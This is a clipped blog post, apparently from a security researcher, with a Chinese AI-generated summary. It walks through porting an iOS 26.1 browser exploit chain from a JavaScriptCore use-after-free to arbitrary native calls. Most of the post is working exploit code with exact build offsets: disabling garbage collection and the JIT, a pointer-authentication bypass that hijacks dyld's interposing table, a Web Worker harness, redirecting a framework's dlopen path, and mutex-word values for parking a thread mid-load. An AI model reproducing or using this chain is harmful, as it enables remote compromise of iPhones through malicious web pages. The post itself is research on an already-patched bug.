---
title: "pois0nSword: From Renderer R/W to Native Calls on iOS 26.1 | Varik's Blog"
source: https://varik.dev/blog/jsc/pois0nsword-native-calls
source_host: varik.dev
clip_date: 2026-09-22T10:18:06+08:00
trace_id: 65ab4b6e-cbaa-4e98-95a0-8c654e5ff0c0
content_hash: ec6bba992cf171931b5b2da0acd50abe496bde2393f8ac82a99c7c04b7428ed7
status: synced
tags:
  - iOS逆向
  - 漏洞分析
series: null
feed_source: Varik
ai_summary: 把 JSC CVE-2025-43529 的 UAF 升级为 iOS 26.1 WebContent 沙箱内的任意原生调用：不伪造 PAC 签名指针，而是劫持 dyld 的 interposingTuplesAll 让加载器自己签名。
ai_summary_style: key-points
images_status:
  total: 1
  succeeded: 1
  failed_urls: []
notion_page_id: 3e375244-d011-8135-b4ed-fdba04da57f0
ioc:
  cves:
    - CVE-2025-43529
  cwes: []
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> 把 JSC CVE-2025-43529 的 UAF 升级为 iOS 26.1 WebContent 沙箱内的任意原生调用：不伪造 PAC 签名指针，而是劫持 dyld 的 interposingTuplesAll 让加载器自己签名。
> 
> - **冻结运行时：** 写 `Heap::m_isSafeToCollect=0`（23B85 为 `0x259`，非网文流传的 `0x241`）禁用后续 GC，并预先分配大 ArrayBuffer 冲刷已在飞行中的回收周期；同时把 `jitAllowList` 标记为已初始化且留空，令 `shouldJIT()` 对所有 code block 返回 false，避免 JIT 重编改动伪造结构。
> - **绕过 PAC：** dyld 的 `RuntimeState +0xb8/+0xc0` 是 interposingTuplesAll 的 buffer 与 count，指向伪造元组表即可重定向后续符号解析；这两处位于 `__TPRO_CONST`，自己的 `write64` 会触发 `KERN_PROTECTION_FAILURE`，只能借 dyld 之手写入。
> - **写入原语：** 利用 dlopen 返回时 `lsl::Vector` 析构中 `Allocator::free()` 的 `_allocatedBytes -= metadata->size()`，改写 Vector 的 `_allocator`（落点）与 `_buffer`（减数）实现定点递减；并在加载中途用 `__cxa_atexit` 互斥锁停住线程，26.1 的锁字改为双计数器（lock/unlock generation），误写 `0x101` 会触发 `brk #0xb001`。
> - **多线程与载体：** 需要 4 个 Web Worker（两个被停车、两个一次性 spare），通过 `ImageBitmap.close()` 让 ObjC `+initialize` 在指定线程内触发 TextToSpeech 的 dlopen；必须 `willReadFrequently:true` 才得到带 ObjC 析构 gadget 的 CPU 侧 ImageBuffer，唤醒载体还需目标 dylib 真正注册 C++ 静态析构（如 XOJIT、HomeUI）。
> - **调用与门槛：** 用 ImageIO 的 CMPhoto 惰性符号解析器把 dlsym 返回的已签名 `dlopen`/`dlsym`/签指针写入 gFunc 全局，再以 Security 块 thunk 作 gadget 完成 `pc+x0-x2+返回值` 的调用；触发走电话号码扫描，需强制打开两个 embedder 字节（`telephoneNumberParsingEnabled` 默认为 false），并用 `data-mime-type="text/latex"` 阻止 WebCore 读取伪造的 out 参数。

In [Part 1](https://varik.dev/blog/jsc/jsc-exploitation-primitives-part-1) we climbed a single out-of-bounds write to cage-free `read64` / `write64` inside the renderer. That OOB was planted by hand to keep the focus on the primitives; the real chain begins a step earlier, at the **CVE-2025-43529** use-after-free, whose freed `JSCell` we reclaim with a controlled object to get a type-confusion gadget - and it is that confusion we ride up to the same `read64` / `write64`. This post is the logical Part 2 of that first one - it picks up exactly where Part 1 left off, turning that read/write into an **arbitrary native call** inside the WebContent sandbox.

The road there is [pois0nSword](https://github.com/GenericCoding/pois0nSword) - [@GenericCoding](https://x.com/GenericCoding) started it as a port of the DarkSword chain to iOS 26.1. After the first post went up, GenericCoding reached out and I joined. From there we built it together, starting with exactly the two things Part 1 said were next: **disabling the GC** and the **PAC wall**. This post is our joint writeup of that port - a field report on what moving a chain from 18.6 to 26.1 really costs, where "the same technique" turns out to mean "the same idea, and about six new walls".

Everything here runs on a research device (`vphone`, iOS 26.1 build 23B85, iPhone17,3-class) against an already-patched bug. Treat every constant as a snapshot of that exact build. Since the first draft the same build has run the fcall end-to-end on a stock iPhone too; Step 10 covers the one embedder preference that silently disabled the trigger there.

**Jump to a part:**

-   [Step 1 - Turning off the GC](#step-1---turning-off-the-gc) - and keeping R/W alive when the heap moves
-   [Step 2 - The PAC wall](#step-2---the-pac-wall) - why you can't just overwrite a vtable anymore
-   [Step 3 - The interpose primitive](#step-3---the-interpose-primitive) - dyld's own allocator does the write for us
-   [Step 4 - Setting up the workers](#step-4---setting-up-the-workers) - you cannot park the thread you're standing on
-   [Step 5 - dlopen on demand](#step-5---dlopen-on-demand) - hijacking the TextToSpeech bundle loader
-   [Step 6 - Parking mid-dlopen](#step-6---parking-mid-dlopen) - `__cxa_atexit` as a tripwire
-   [Step 7 - Three locks](#step-7---three-locks) - what 26.1 hardened, and how each one is beaten
-   [Step 8 - The wake and the write](#step-8---the-wake-and-the-write) - forging a `Vector` on a frozen stack
-   [Step 9 - From table to gadgets](#step-9---from-table-to-gadgets) - making ImageIO resolve our function pointers
-   [Step 10 - slow_fcall](#step-10---slow_fcall) - a phone-number scan that calls anything

## Step 1 - Turning off the GC

This is the direct continuation of where Part 1 stopped. All those fake cells - `changeArr`, the forged `StringImpl`, the hijacked butterflies - are landmines the moment the collector marks one. The blunt fix is to stop the collector entirely by clearing [`JSC::Heap::m_isSafeToCollect`](https://github.com/apple-oss-distributions/JavaScriptCore/blob/JavaScriptCore-7611.3.10.1.3/heap/Heap.h#L654):

```javascript
const vm = read64(
  read64(addrof(globalThis) + structs.GlobalObject_toVM_a) + structs.GlobalObject_toVM_b
)
const heap = vm + structs.VM_heap
const isSafeToCollect = heap + structs.Heap_isSafeToCollect
write8(isSafeToCollect, 0n)
```

`collectIfNecessaryOrDefer` compares that byte against 1 and returns early when it isn't, so a single byte write disables every future cycle.

Two things worth saying out loud, because both cost us time.

**The offsets drift, and they drift independently.** On 23B85 the correct values are `offsetof(VM, heap) = 0xc0` and `offsetof(Heap, m_isSafeToCollect) = 0x259`. The published pois0nSword values were `0xc0` and `0x241`, and a local debug build had `0x2a1`. We burned a while assuming the base was wrong when it was the field, and then the reverse. Get both from the binary rather than from any writeup, including this one:

```javascript
VM ctor    @ 0x197f9da8c :  add x0, x19, #0xc0 ; bl notifyIsSafeToCollect   -> heap = vm + 0xc0
collectIfNecessaryOrDefer @ 0x1980d0808 :  ldrb w8, [x0, #0x259] ; cmp #1 ; b.ne ret
```

**Disabling the GC is not the same as making your primitives immortal.** `m_isSafeToCollect = 0` only blocks *new* cycles. If a collection was already in flight when you flipped it, it finishes, and it will happily reclaim the dangling cell your whole R/W is built on. In practice we hit this because the heavy UAF grooming left a cycle running. The fix is a pre-flush right before the fakes become reachable:

```javascript
for (let i = 0; i < 300; i++) new ArrayBuffer(0x100000)
await new Promise((r) => setTimeout(r, 50))
```

And later in the chain, when we start side-loading real dylibs into the process, the heap shifts hard enough that primitives can silently rot - a `read64` that returns stale garbage is far worse than one that crashes, because you act on the garbage. So the chain re-validates rather than trusts. The whole check is four assertions:

```javascript
// 1. addrof / fakeobj are still inverse
const probe = { marker: 1.1 }
if (fakeobj(addrof(probe)) !== probe) return fail('fakeobj(addrof(o)) !== o')

// 2. read64 agrees with a TypedArray's own backing store (known address, known contents)
const t = new BigUint64Array(8)
const td = read64(addrof(t) + 0x10n) // m_vector
t[0] = 0x4142434445464748n
if (read64(td) !== 0x4142434445464748n) return fail('read64 != JS write')

// 3. write64 is visible from JS, and nothing truncates on the way through
write64(td + 8n, 0xcafef00dd00dfeedn)
if (t[1] !== 0xcafef00dd00dfeedn) return fail('write64 != JS read')

// 4. a value whose SHAPE we know independently: parseFloat's native implementation
//    must land inside the dyld shared cache
const exe = read64(addrof(parseFloat) + structs.JSFunction_executable)
const fn = noPAC(read64(exe + structs.NativeExecutable_function))
if (fn < 0x180000000n || fn >= 0x400000000n) return fail('native ptr not in shared cache')
```

The fourth check is the important one. The first three only show that the primitives agree with each other, and a broken primitive can still manage that - point `read64` at the wrong place and it will read and write its own garbage quite happily. The fourth one reads a value we already know the shape of from outside the exploit, so it catches a primitive that is confidently returning nonsense.

### And stop the JIT from recompiling under us

While we are freezing the runtime in place, we do the same to the JIT. Right after the slide is applied, stage 2 writes the JIT call-target allowlist:

```javascript
write64(offsets.JavaScriptCore__jitAllowList_once, 0xffffffffffffffffn) // once = "already initialized"
write64(offsets.JavaScriptCore__jitAllowList + 8n, 1n)
```

It is easy to read that name backwards. `jitAllowlist` is not a switch that turns JIT *on* - it is a gate that decides which code blocks may be JIT-compiled at all. Every code block consults it through [`shouldJIT()`](https://github.com/apple-oss-distributions/JavaScriptCore/blob/eef51e0fbf4a4fa75a0e472d2480fa30c278e423/llint/LLIntSlowPaths.cpp#L349):

```cpp
inline bool shouldJIT(CodeBlock* codeBlock) {
    if (!Options::bytecodeRangeToJITCompile().isInRange(codeBlock->instructionsSize())
        || !ensureGlobalJITAllowlist().contains(codeBlock))
        return false;
    return Options::useBaselineJIT();
}
```

A code block that is **not** in the allowlist gets `shouldJIT() == false`, and the runtime answers with `codeBlock->dontJITAnytimeSoon()` - it stays in the LLInt interpreter, permanently. By marking the allowlist initialized before it ever reads the real file, and leaving it empty, we make `shouldJIT()` return false for **every** code block. The JIT is off, and everything the exploit runs - and everything that runs over our fake cells - stays interpreted, where nothing gets recompiled underneath us.

This matters for the same reason the GC switch matters. Our fake `ArrayBuffer` s, forged butterflies and hijacked objects are all valid *interpreter* state. The JIT is a compiler that rewrites code and, in doing so, re-validates and re-layouts the very structures we are lying about. Keeping JSC on the interpreter is part of making the lie stable.

## Step 2 - The PAC wall

With R/W up, the classic next move is to find a code pointer, overwrite it, and take control. On arm64e that move is dead.

Every function pointer, return address, and C++ vtable entry that matters is **PAC-signed**: the top bits carry a MAC over the pointer value and a context (usually an address plus a discriminator). The CPU authenticates on use - `blraa`, `retab`, `autda` - and a pointer you invented fails authentication and traps. Writing a raw address into a vtable slot gets you a crash, not a jump.

So we have arbitrary read/write and no way to spend it on control flow. What we need is not "a signing oracle" in the abstract, but something in the process that is **already allowed to sign pointers, and can be pointed at ours**.

That thing is dyld.

The dynamic loader's whole job is to take pointers off disk and make them valid at runtime: it relocates them, applies chained fixups, and **signs** them (`signPointer`) so the code that later authenticates them succeeds. dyld holds the keys, by design.

And dyld exposes exactly the mechanism we need to redirect a call: **interposing**. An interpose tuple is a `(replacee, replacement)` pair; when the loader binds symbols, any reference to `replacee` resolves to `replacement` instead. It's the supported way `DYLD_INSERT_LIBRARIES` shims work.

dyld keeps the active set inside [`dyld4::RuntimeState`](https://github.com/apple-oss-distributions/dyld/blob/main/dyld/DyldRuntimeState.h#L90), the singleton that holds all of the loader's global state. It comes up constantly from here on, so I'll shorten it to **`RS`**. One exported symbol gets us the pointer:

```javascript
const runtimeState = p.read64(offsets.libdyld__gAPIs) // dyld4::gAPIs -> RuntimeState*
```

The member we are after is declared like this, and it is worth noticing that it is itself one of dyld's own vectors:

```cpp
Vector<InterposeTupleAll> interposingTuplesAll;   // DyldRuntimeState.h
```

So the two fields we need to change are that vector's buffer pointer and its element count:

```javascript
  RS + 0xb8    interposingTuplesAll  buffer   (pointer to the tuple array)
  RS + 0xc0    interposingTuplesAll  count    (how many tuples dyld will walk)
```

> If we can make `interposingTuplesAll` point at a buffer we control, then we choose what every subsequent symbol resolution in the process returns. We never forge a signed pointer - we make dyld hand us real ones, and we redirect real calls to them.

That is the whole plan. Everything else in this post is the work needed to overwrite those two fields.

## Step 3 - The interpose primitive

This part is the core trick, so it's worth going slowly.

dyld has its own allocator and its own container types. When it loads an image it builds an `lsl::Vector` (dyld's in-house `std::vector`, in `lsl/Vector.h` of the [dyld source](https://github.com/apple-oss-distributions/dyld/blob/main/lsl/Vector.h#L55)) holding metadata about the load. When `dlopen` returns, that vector goes out of scope and its destructor runs:

```cpp
~Vector() {
    if (_buffer) {
        resize(0);
    }
}

void resize(size_type newCapacity) {
    if (newCapacity > capacity()) {
        ...
    } else if (newCapacity == 0) {
        deleteElements(0, _size);
        if (_buffer) {
            _allocator->free((void*)_buffer);
        }
        _buffer = nullptr;
        _size = 0;
        _capacity = 0;
    } else {
        ...
    }
}
```

`_allocator` and `_buffer` are both **fields of the Vector**. And inside `free`:

```cpp
void Allocator::free(void* ptr) {
    if ( !ptr ) { return; }
    ...
    AllocationMetadata* metadata = AllocationMetadata::forPtr(ptr);
    _allocatedBytes -= metadata->size();
    metadata->deallocate();
    validate();
}
```

One line matters:

```cpp
_allocatedBytes -= metadata->size();
```

That line reads a value, subtracts something, and writes it back - through a pointer that comes straight out of the Vector. `_allocatedBytes` lives at a fixed offset inside the allocator object, and the allocator object is just `_allocator`, a Vector field. The amount subtracted comes from a header in front of `_buffer`, another Vector field.

So if we can rewrite the Vector before the destructor runs, we choose two things:

-   **where the write lands**, by choosing `_allocator`
-   **what gets subtracted**, by choosing `_buffer` and the header we put in front of it

`_allocatedBytes` sits at `_allocator + 0x10`, so the address we want to write decides where `_allocator` has to point:

```javascript
  we want the write to land on   RS + 0xb8        (interposingTuplesAll buffer)
  _allocatedBytes is at          _allocator + 0x10
  therefore                      _allocator = RS + 0xb8 - 0x10

  then free() executes:  *(RS + 0xb8)  -=  metadata->size()
```

Pick a `size` that makes `old - size` equal the address of our tuple array, and dyld writes our interpose table into its own state. We never touch the field ourselves.

We have to do it this way. On 26.1, `RS + 0xb8` and `RS + 0xc0` sit inside dyld's `__TPRO_CONST` pool. Writing there with our own `write64` faults with `KERN_PROTECTION_FAILURE`, on the research device and on stock hardware - we can read those pages, but not write them. dyld makes them writable for itself, one thread at a time, with `os_thread_self_restrict_tpro_to_rw`. So **dyld is the only one that can write this field**, and going through `free()` is the only way in. We learned that by trying the direct write first and collecting two crash reports.

One more thing helps us: when `dlopen` is returning, that `Vector` is **on the stack**. If we can freeze a thread inside `dlopen` before the destructor runs, its stack is just memory we can edit.

So the very same `free()` does two completely different things depending on what the Vector says. Here is the normal case first:

Stock: dlopen runs to completion

worker thread

executingdlopen(libARI)

thread's stackdlopen_from frame

framedlopen_from

Vector.\_allocatordyld allocator

Vector.\_bufferdyld heap chunk

\__cxa_atexit mutex

statefree

dyld's allocator

\_allocatedBytes0x4e20

RuntimeState (RS)

+0xb8 tuples bufferdyld internal

+0xc0 tuples count0x9

01/06A thread calls dlopen. dyld maps the image and builds a stack frame for the load.

Now the same code path, with two fields changed while the thread is asleep:

Hijacked: the same free(), pointed somewhere else

worker thread

executingidle

thread's stackdlopen_from frame

frame-

Vector.\_allocator-

Vector.\_buffer-

\__cxa_atexit mutex

stateheld (0x102)

dyld's allocator

\_allocatedBytes0x4e20

RuntimeState (RS)

+0xb8 tuples bufferdyld internal

+0xc0 tuples count0x9

01/09First we grab the atexit mutex and hold it, before triggering any load.

## Step 4 - Setting up the workers

Freezing a thread inside `dlopen` means that thread stops answering. If that's the thread running our exploit, the exploit is over. So the first structural requirement is other threads.

Web Workers give us real OS threads in the same process, with the same address space. The harness spawns them from a blob whose entire job is to hold an `ImageBitmap` and close it on command:

```javascript
const dlopen_worker = `(() => {
  self.onmessage = function (e) {
    const { type, data } = e.data;
    switch (type) {
      case 'init':
        const canvas = new OffscreenCanvas(64, 64);
        const cx = canvas.getContext('2d', { willReadFrequently: true });
        cx.fillStyle = '#f00';
        cx.fillRect(0, 0, 64, 64);
        globalThis[0] = data;                       // marker, so the chain can find this worker
        createImageBitmap(canvas).then(bitmap => {
          globalThis[1] = bitmap;                   // the trigger object
          self.postMessage(null);
        });
        break;
      case 'dlopen':
        self.postMessage('close() ENTER');
        globalThis[1].close();                      // <- this is what parks the thread
        self.postMessage('close() RETURNED -- no park (dlopen did not block)');
        break;
    }
  };
})();`
```

Two details in there matter more than they look.

`globalThis[0] = data` plants an integer marker (`0x11111111`, `0x22222222`, `0x33333333`, `0x44444444` - one per worker, `0x11111111 * i`) as an indexed property, which means it lands in the worker global's butterfly at a predictable slot. That's how the chain identifies which worker is which - allocation order is not stable, and stage 4 must plant its class into the exact worker the page will later tell to `close()`.

`willReadFrequently: true` looks like a performance hint and is actually the difference between the technique working and not, for reasons we'll get to in the next section.

We spawn four:

```javascript
// [0] = worker1 park, [1] = worker2 park, [2] = SPARE for worker1's wake fire,
// [3] = SPARE for worker2's wake fire -- each spare's close() runs the AVSpeech gate
// on ITS thread, so the chain never runs the gate itself.
for (let i = 1; i <= 4; ++i) {
  const worker = new Worker(dlopen_worker_url)
  dlopen_workers.push(worker)
  await new Promise((r) => {
    worker.postMessage({ type: 'init', data: 0x11111111 * i })
    worker.onmessage = r
  })
  worker.onmessage = (e) => log('dlopen_worker' + i + ': ' + e.data)
}
```

Two spares, not one, because a spare is single-use: its `ImageBitmap` is consumed by the first `close()`, and a spent spare can never fire again. Each wake gets its own - `0x33333333` for worker1's fire, `0x44444444` for worker2's.

Now the chain has to find those threads *in memory*, because it needs each one's `WTF::Thread` (for its stack bounds, later) and its mach thread port (for the lock work in Step 7). WebCore keeps a process-wide registry of every script execution context, which is exactly the handle we need:

```javascript
const contexts = p.read64(offsets.WebCore__allScriptExecutionContextsMap_contexts)
const contexts_length = p.read64(contexts - 8n) >> 32n

for (let i = 0n; i < contexts_length; ++i) {
  const ptr = contexts + i * structs.ContextsMap_stride
  if (!p.read64(ptr)) continue
  const context = p.read64(ptr + structs.ContextsMap_value)
  const vtable = noPAC(p.read64(context))
  if (vtable != offsets.WebCore__DedicatedWorkerGlobalScope_vtable) continue // workers only

  const gs = workerGlobalScope(context) // ctx -> m_script -> m_globalScopeWrapper
  const id = workerMarker(context) //        gs.butterfly[0]  = our marker
  const bitmap = workerBitmap(context) //        gs.butterfly[1]  = the ImageBitmap
  const wot = noPAC(p.read64(context + structs.WorkerGlobalScope_thread))
  const thread = p.read64(wot + structs.WorkerThread_wtfThread) // -> WTF::Thread
  const threadPort = portFromContext(context) // -> mach thread port

  const tag = id & 0xffffffffn
  if (tag === 0x11111111n || tag === 0x22222222n) {
    p.dlopen_workers.push({ ctx: context, thread, threadPort, id, bitmap })
  } else if (tag === 0x33333333n || tag === 0x44444444n) {
    // the SPAREs (one per wake fire; see the spawn loop above)
    ;(p.spare_workers = p.spare_workers || []).push({ ctx: context, thread, threadPort, id })
  }
}
p.dlopen_workers.sort((a, b) => Number((a.id & 0xffffffffn) - (b.id & 0xffffffffn)))
p.spare_workers.sort((a, b) => Number((a.id & 0xffffffffn) - (b.id & 0xffffffffn)))
```

Filtering on the `DedicatedWorkerGlobalScope` vtable is what separates workers from documents, and `noPAC` is needed because the vtable pointer itself is signed. The explicit sort at the end exists because the map walk order is not stable across runs, and the page always fires `close()` at `dlopen_workers[0]`.

The token read is two shape-validated 32-bit loads off the `WTF::Thread`. Only three fields matter, and they sit consecutively ([`Source/WTF/wtf/Threading.h`](https://github.com/WebKit/WebKit/blob/main/Source/WTF/wtf/Threading.h)):

```cpp
class Thread {                              // ... earlier members omitted
    PlatformThreadHandle m_handle;          // +0x28   == pthread_t
    const uint32_t       m_uid;             // +0x30   main thread == 1, workers ++
    mach_port_t          m_platformThread;  // +0x34   the mach thread port  <- the token
};
```

`m_platformThread` is the number Step 7 needs: on 26.1 every lock stores the owning thread's mach port, so this field is the key we cut in advance for each worker.

```javascript
// 23B85:  m_handle +0x28 (== pthread_t),  m_uid u32 +0x30,  port u32 +0x34
function portFromWtfThread(thread) {
  const uid = BigInt(p.read32(thread + 0x30n))
  const port = BigInt(p.read32(thread + 0x34n))
  if (
    !(uid >= 1n && uid < 0x10000n && port >= 0x100n && port < 0x10000000n && (port & 0xffn) !== 0n)
  ) {
    postMessage(`[-] bad uid/port ${hex(thread)} uid=${hex(uid)} port=${hex(port)}`)
    return 0n
  }
  const pthread = p.read64(thread + 0x28n)
  if (ptrOK(pthread)) p.knownPthread = pthread // anchor for the main-thread walk
  return port
}
```

Hold onto that port value. In Step 7 it becomes the most important number in the chain.

## Step 5 - dlopen on demand

We need the process to `dlopen` a path of our choosing, on a thread of our choosing. There's no `dlopen()` in JavaScript, so we borrow one.

The vehicle is **AVSpeech**. The speech synthesis stack is plugin-based, and it doesn't load `TextToSpeech.framework` when the app starts - it waits until something actually touches one of the `AVSpeechSynthesis*` classes for the first time, and only then loads it. That deferred load walks the framework's `CFBundle`, reads the executable path out of it, and calls `dlopen` on that path.

Two things make this the ideal vehicle. The load is **deferred**, so we decide when it happens. And the path it loads comes from **a field in memory we can overwrite**.

### Making Objective-C touch a class of our choosing

To start that load we need to touch an `AVSpeechSynthesis*` class from JavaScript, which we obviously can't do directly. This is where the `ImageBitmap` comes in:

```javascript
async function loadObjcClass(cls) {
  if (!p.silentLoad) {
    if (p.workerParked) atexitWake()
    else atexitPass()
  }

  const cx = canvas.getContext('2d', { willReadFrequently: true })
  cx.fillStyle = '#f00'
  cx.fillRect(0, 0, 64, 64)
  const bitmap = await createImageBitmap(canvas)
  const ab = p.addrof(bitmap)
  const wrappedBitmap = p.read64(ab + p.structs.JSImageBitmap_wrapped)
  const imagebuffer = p.read64(wrappedBitmap + p.structs.ImageBitmap_buffer)
  p.write64(imagebuffer + p.structs.ImageBuffer_objcClass, cls) // <- plant the class
  bitmap.close() // <- fires the objc message
  if (!p.noAtexitPark) atexitHold()
}
```

`WebCore::ImageBuffer` keeps the Objective-C class of its backing surface at `+0x20`, and when the buffer is destroyed it sends that class a message. So we overwrite that field with any class pointer we want. Then `close()` releases the buffer, the destructor runs, and the message goes to **our** class instead of the real one.

That message is the whole point, because of what Objective-C does the first time a class is used. Classes are set up lazily: the runtime does the one-time preparation on first use, and part of that preparation is calling the class's `+initialize` method. `AVSpeechSynthesisProviderRequest` and its siblings use `+initialize` to kick off the TextToSpeech load. So a single message to a class nobody has touched yet turns into a `dlopen`.

And the useful detail is **where** that happens. `+initialize` runs inline, on the thread that sent the message - there is no dispatch to a background queue. The message came from `bitmap.close()`, and each of our workers can close its own bitmap. So by picking which worker we tell to call `close()`, we pick which thread ends up inside `dlopen`:

```javascript
  worker1 calls close()  ->  its bitmap's ImageBuffer is destroyed
                         ->  message sent to the class we planted
                         ->  +initialize runs ON WORKER1
                         ->  TextToSpeech load  ->  dlopen  ->  worker1 is inside dyld
```

That matters because of what comes next: we are going to freeze whichever thread is inside `dlopen`. It must be a thread we can afford to lose, never the one running the exploit.

Now, `willReadFrequently`. Without it, `createImageBitmap(OffscreenCanvas)` on 26.1 gives you a `WebKit::RemoteImageBufferProxy` - a GPU-process-backed C++ object whose destructor never touches `+0x20` and whose teardown is PAC-protected virtual dispatch. We spent a genuinely embarrassing amount of time convinced the `+0x20` offset had drifted, disassembling a destructor that structurally could not do what we needed. It wasn't the offset. `willReadFrequently: true` forces a CPU-local `WebCore::ImageBuffer`, and *that* one has the ObjC gadget. The offset was right the whole time; the object type was wrong.

### Redirecting the bundle

Now that we can start the load on a thread of our choosing, we point it at our path:

```javascript
p.rearmCFBundleLoader = (cstringOffset, cstringSize) => {
  p.write64(TextToSpeech_NSBundle + structs.NSBundle_flags, 0x40008n) // "not loaded"
  p.write8(TextToSpeech_CFBundle + structs.CFBundle_loadedFlag, 0n) // "not loaded"
  p.write64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken, 0n) // re-arm the gate
  p.write64(
    offsets.CFNetwork__gConstantCFStringValueTable + structs.CFString_dataPtr,
    cstringOffset
  )
  p.write64(offsets.CFNetwork__gConstantCFStringValueTable + structs.CFString_length, cstringSize)
  p.write64(
    TextToSpeech_CFBundle + structs.CFBundle_execPath,
    offsets.CFNetwork__gConstantCFStringValueTable
  )
  atexitHold() // arm the trap the loaded dylib will fall into (Step 6)
}
```

Those writes land on two fields of the `CFBundle` (`struct __CFBundle` in CoreFoundation's `CFBundle_Internal.h`), plus the executable-path field it caches:

```c
struct __CFBundle {                     // ... other members omitted
    Boolean     _isLoaded;              // +0x34   CFBundle_loadedFlag
    CFStringRef _executablePath;        // +0x68   CFBundle_execPath (calculated & cached here)
};
```

`_executablePath` being **cached** is the whole opening: CoreFoundation resolves the path once and reuses it, so overwriting this field redirects the `dlopen` without CF ever recomputing it from the bundle URL.

Three lies, told in order:

1.  **Clear both loaded flags.** `-[NSBundle isLoaded]` checks bit 26 of the `NSBundle` flags, and falls back to `CFBundle._isLoaded` (the byte at `+0x34`). Clearing both makes CoreFoundation believe an already-loaded framework was unloaded, so it is willing to load it again.
2.  **Zero the `dispatch_once` token.** The deferred loader is meant to run once per process. Zeroing the token makes "once" mean "again, now".
3.  **Repoint the executable path.** We cannot write to a constant `CFString` - those live in read-only `__AUTH_CONST`, and we proved that the hard way by faulting on one and corrupting our own R/W in the process. What *is* writable is `gConstantCFStringValueTable`, a mutable CFString in CFNetwork's data segment. So we overwrite that string's character pointer and length, and point the bundle's `execPath` at it. Now the loader `dlopen` s whatever we want.

The string itself needs to be real memory containing our bytes. DarkSword builds it out of JSC internals - append `'\0'` to force a rope, `delete` it out of an array to force flattening, then read `StringImpl+8` as the character pointer. That works on iOS 18.6. On 26.1 it silently corrupts short paths, because JSC stores short strings **inline**: `StringImpl+8` isn't a pointer to the characters, it *is* the characters. For `/usr/lib/libARI.dylib` the code was reading the ASCII `'/usr/lib'` as an address.

The failure was invisible at the point of the bug and loud three layers away: garbage path, failed `dlopen`, loader block takes its error-return path, and its `dispatch_once` completion aborts on a token nobody expected. Now we skip JSC's string internals entirely:

```javascript
p.makeCString = (str) => {
  const buf = new BigUint64Array(0x40) // 512 bytes, GC-pinned in p.cstrBufs
  p.cstrBufs.push(buf)
  const data = buf.data()
  const full = str + '\0'
  for (let i = 0; i < full.length; i += 8) {
    let q = 0n
    for (let j = 0; j < 8 && i + j < full.length; j++)
      q |= BigInt(full.charCodeAt(i + j)) << BigInt(8 * j)
    p.write64(data + BigInt(i), q)
  }
  return { ptr: data, len: BigInt(str.length) }
}
```

Deterministic for any length, no dependence on string representation. This is a good example of the general shape of this port: the technique was fine, an assumption underneath it had quietly stopped being true.

## Step 6 - Parking mid-dlopen

We need the loading thread to stop at a very specific moment: **after** dyld has built the stack frame with the Vector on it, but **before** the code at the end of `dlopen` cleans that frame up. Too early and the Vector isn't there yet. Too late and it's already been freed.

`__cxa_atexit` gives us exactly that moment. When a dylib has global C++ objects, its initializers construct them, and each one registers its destructor by calling `__cxa_atexit`. That function appends to a process-wide list, so it takes a lock first. Every dylib with global C++ objects therefore passes through one particular mutex while it is loading - after the image is mapped and the frame exists, and before `dlopen` returns.

So we hold that mutex ourselves. When the loading thread reaches `__cxa_atexit` it cannot get the lock, blocks in `__psynch_mutexwait`, and stops. Its stack stops changing with it.

That is the whole idea. Making it work took much longer, because of how the mutex actually stores its state.

### The mutex word is two counters, not a flag

DarkSword writes `0x101` here, meaning "unlocked, but there is a waiter". On 18.6 that works. On 26.1 the same value kills an unrelated thread. Understanding why meant reading libpthread. The 64-bit word at `+0x20` is not a flag - it is [`mutex_seq`](https://github.com/apple-oss-distributions/libpthread/blob/main/src/pthread_mutex.c), a union of two 32-bit counters:

```c
typedef union mutex_seq {
    uint32_t seq[2];
    struct { uint32_t lgenval; uint32_t ugenval; };   // lock-gen / unlock-gen
    struct { uint32_t mgen;    uint32_t ugen; };       // same two words, "m"/"u" naming
    uint64_t seq_LU;
    uint64_t _Atomic atomic_seq_LU;
} mutex_seq;
```

`lgenval` (low half) is the **lock generation** - the chain's "waiter count"; `ugenval` (high half) is the **unlock generation** - the "wake generation". Mapping the union onto what the disassembly showed:

```javascript
word @ atexit mutex + 0x20  (23B85, NORMAL flavor)

  bit0  (0x01)         kernel-ulock-allocated flag
  bit1  (0x02)         HELD
  low-half  bits 8-31  waiter count      = lgenval, +0x100 per registered waiter
  high-half bits 8-31  wake generation   = ugenval, +0x100 per drop

pthread_mutex_unlock fast path (0x1df14da44):
    if ((low & 0xffffff00) == (high & 0xffffff00))  -> clear HELD, NO kernel call
unlock_slow (0x1df14dfc4)  fires only when count > gen:
    clear HELD, gen += 0x100<<32, then __psynch_mutexdrop wakes every sleeper
```

So the question is not "is there a waiter". It is **"is the waiter count bigger than the wake generation"**. If it is, the next unlock calls into the kernel to wake somebody.

26.1 then added a check that 18.6 did not have. If that kernel wake returns an error - and it returns `ENOENT` when no thread is actually asleep on the word - libpthread deliberately crashes the thread that did the unlocking:

```javascript
brk #0xb001    "BUG IN LIBPTHREAD: __psynch_mutexdrop failed"    (0x1df14ed48)
```

Now put those together. Writing `0x101` says "count 1, generation 0", which means "somebody is asleep here". If nobody actually is, the next thread to call `__cxa_atexit` anywhere in the process will try to wake them, get `ENOENT`, and die. And plenty of threads we don't control call `__cxa_atexit`. On 18.6 that error was ignored, so the same write was harmless.

This is the pattern that shows up again and again in this port: on 18.6 you could write a value that was roughly right, and on 26.1 the system checks it.

So we use four different values, and the difference between two of them is the important bit:

```javascript
const A = () => offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState

// PARK: held + a registered waiter, gen 0. The next thread's __cxa_atexit blocks here.
const atexitHold = () => p.write64(A(), 0x102n)

// WAKE: count(0x100) > gen(0) -> the next real unlock drops and wakes every sleeper.
// ONLY safe when a sleeper provably exists (p.workerParked), else brk #0xb001.
const atexitWake = () => p.write64(A(), 0x101n)

// PASS: count == gen -> every future unlock takes the fast path. No drop, no brk,
// nobody woken. Unconditionally safe.
const atexitPass = () => p.write64(A(), 0x0000010000000101n)

// SILENT: no waiter at all. A load runs with no broadcast; a parked worker stays parked.
const atexitSilent = () => p.write64(A(), 0x01n)
```

`atexitPass` and `atexitWake` both look like "unlocked, with a waiter", but only `atexitWake` claims the count is ahead of the generation. Use it when nobody is parked and you have armed a trap for some other thread to walk into.

### Proving the park actually happened

We also need to know **when** worker1 has actually parked, because the wake has to come after it. The chain used to work this out from the mutex word, checking whether the waiter count had gone up.

